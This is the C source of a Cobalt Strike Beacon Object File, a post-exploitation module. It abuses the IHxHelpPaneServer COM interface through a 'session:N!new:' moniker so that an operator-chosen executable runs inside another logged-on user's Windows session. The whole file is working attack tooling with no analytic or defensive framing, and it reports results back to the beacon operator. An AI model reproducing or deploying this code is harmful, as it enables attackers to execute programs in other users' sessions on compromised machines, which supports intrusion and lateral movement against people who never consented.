#include <windows.h>
#include <objbase.h>
#include "beacon.h"

#define BeaconPrint(...) \
    do { \
        BeaconFormatPrintf(&output, ##__VA_ARGS__); \
    } while (0)

// BOF API declarations
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$lstrlenW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI LPWSTR WINAPI KERNEL32$lstrcpyW(LPWSTR, LPCWSTR);

DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT WINBASEAPI void WINAPI OLE32$CoUninitialize();
DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$CreateBindCtx(DWORD, LPBC*);
DECLSPEC_IMPORT WINBASEAPI HRESULT WINAPI OLE32$MkParseDisplayName(LPBC, LPCOLESTR, ULONG*, LPMONIKER*);

DECLSPEC_IMPORT int __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcschr(const wchar_t*, wchar_t);

// Global GUID in .data section
GUID __attribute__((section(".data"))) IID_IHxHelpPaneServer = {
    0x8cec592c, 0x07a1, 0x11d9, 
    {0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee}
};

// Interface vtable definition
typedef struct IHxHelpPaneServerVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *This, REFIID riid, void **ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(void *This);
    ULONG (STDMETHODCALLTYPE *Release)(void *This);
    HRESULT (STDMETHODCALLTYPE *DisplayTask)(void *This, LPCWSTR task);
    HRESULT (STDMETHODCALLTYPE *DisplayContents)(void *This, LPCWSTR contents);
    HRESULT (STDMETHODCALLTYPE *DisplaySearchResults)(void *This, LPCWSTR search);
    HRESULT (STDMETHODCALLTYPE *Execute)(void *This, LPCWSTR file);
} IHxHelpPaneServerVtbl;

typedef struct IHxHelpPaneServer {
    IHxHelpPaneServerVtbl *lpVtbl;
} IHxHelpPaneServer;

void go(char *args, int len) {
    datap parser;
    formatp output;
    HRESULT hr;
    IHxHelpPaneServer *pServer = NULL;
    IBindCtx *pBindCtx = NULL;
    IMoniker *pMoniker = NULL;
    ULONG eaten = 0;
    wchar_t moniker[512];
    wchar_t fullPath[MAX_PATH];
    wchar_t systemDir[MAX_PATH];
    wchar_t fileUri[MAX_PATH * 2];
    wchar_t *executable = NULL;
    wchar_t *src = NULL;
    wchar_t *p = NULL;
    int sessionId = 0;
    int outputSize = 0;
    char *outputString = NULL;
    BOOL comInitialized = FALSE;
    
    // Initialize output buffer
    BeaconFormatAlloc(&output, 0x400);
    
    // Parse arguments
    BeaconDataParse(&parser, args, len);
    sessionId = BeaconDataInt(&parser);
    executable = (wchar_t*)BeaconDataExtract(&parser, NULL);
    
    BeaconPrint("[+] Executing %ls in Session %d\n", executable, sessionId);
    
    // Get System32 directory
    if (KERNEL32$GetSystemDirectoryW(systemDir, MAX_PATH) == 0) {
        BeaconPrint("[!] Failed to get system directory\n");
        goto cleanup;
    }
    
    // Build full path
    if (MSVCRT$wcschr(executable, L'\\') != NULL || MSVCRT$wcschr(executable, L'/') != NULL) {
        KERNEL32$lstrcpyW(fullPath, executable);
    } else {
        MSVCRT$_snwprintf(fullPath, MAX_PATH, L"%s\\%s", systemDir, executable);
    }
    
    BeaconPrint("[+] Full path: %ls\n", fullPath);
    
    // Check if file exists
    if (KERNEL32$GetFileAttributesW(fullPath) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrint("[!] File does not exist: %ls\n", fullPath);
        goto cleanup;
    }
    
    // Convert to file URI format
    MSVCRT$_snwprintf(fileUri, MAX_PATH * 2, L"file:///");
    p = fileUri + KERNEL32$lstrlenW(fileUri);
    
    for (src = fullPath; *src != L'\0'; src++, p++) {
        *p = (*src == L'\\') ? L'/' : *src;
    }
    *p = L'\0';
    
    BeaconPrint("[+] URI: %ls\n", fileUri);
    
    // Initialize COM
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        BeaconPrint("[!] CoInitializeEx failed: 0x%08X\n", hr);
        goto cleanup;
    }
    comInitialized = TRUE;

    // Create bind context
    hr = OLE32$CreateBindCtx(0, &pBindCtx);
    if (FAILED(hr)) {
        BeaconPrint("[!] CreateBindCtx failed: 0x%08X\n", hr);
        goto cleanup;
    }

    // Create moniker string
    MSVCRT$_snwprintf(moniker, 512, 
        L"session:%d!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", 
        sessionId);
    
    BeaconPrint("[+] Moniker: %ls\n", moniker);
    
    // Parse display name to get moniker
    hr = OLE32$MkParseDisplayName(pBindCtx, moniker, &eaten, &pMoniker);
    if (FAILED(hr)) {
        BeaconPrint("[!] MkParseDisplayName failed: 0x%08X\n", hr);
        goto cleanup;
    }
    
    BeaconPrint("[+] Moniker parsed successfully\n");
    
    // Bind to object in target session
    hr = pMoniker->lpVtbl->BindToObject(
        pMoniker, 
        pBindCtx, 
        NULL, 
        &IID_IHxHelpPaneServer, 
        (void**)&pServer
    );
    
    if (FAILED(hr)) {
        BeaconPrint("[!] BindToObject failed: 0x%08X\n", hr);
        goto cleanup;
    }
    
    BeaconPrint("[+] Bound to COM object successfully\n");
    
    // Execute the command
    BeaconPrint("[+] Calling Execute...\n");
    hr = pServer->lpVtbl->Execute(pServer, fileUri);
    
    if (FAILED(hr)) {
        BeaconPrint("[!] Execute failed: 0x%08X\n", hr);
    } else {
        BeaconPrint("[+] Successfully executed in session %d\n", sessionId);
    }

cleanup:
    // Cleanup COM objects
    if (pServer != NULL) {
        pServer->lpVtbl->Release(pServer);
    }
    
    if (pMoniker != NULL) {
        pMoniker->lpVtbl->Release(pMoniker);
    }
    
    if (pBindCtx != NULL) {
        pBindCtx->lpVtbl->Release(pBindCtx);
    }
    
    if (comInitialized) {
        OLE32$CoUninitialize();
    }
    
    // Send output to operator
    outputString = BeaconFormatToString(&output, &outputSize);
    BeaconOutput(CALLBACK_OUTPUT, outputString, outputSize);
    BeaconFormatFree(&output);
}
